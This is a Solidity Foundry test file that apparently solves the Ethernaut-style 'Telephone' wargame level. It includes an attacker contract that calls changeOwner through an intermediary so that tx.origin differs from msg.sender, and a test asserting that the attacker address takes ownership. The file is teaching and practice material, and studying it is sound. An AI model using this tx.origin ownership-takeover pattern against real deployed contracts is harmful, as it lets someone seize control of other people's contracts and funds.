// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import { Telephone } from "../src/04_Telephone.sol";
interface ITelephone {
    function changeOwner(address _owner) external;
}
contract TelephoneAttacker {
    ITelephone public target;
    constructor(address _target){
        target = ITelephone(_target);
    }
    function attack(address _owner) public{
        target.changeOwner(_owner);
    }
}
contract TelephoneTest is Test {
    Telephone public tp;
    TelephoneAttacker public ta;
    address public hacker = address(0x1337);

    function setUp() public {
        tp = new Telephone();
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        ta = new TelephoneAttacker(address(tp)); 
        vm.startPrank(hacker);
        ta.attack(hacker);
        assertEq(tp.owner(), hacker);
        vm.stopPrank();
    }
}
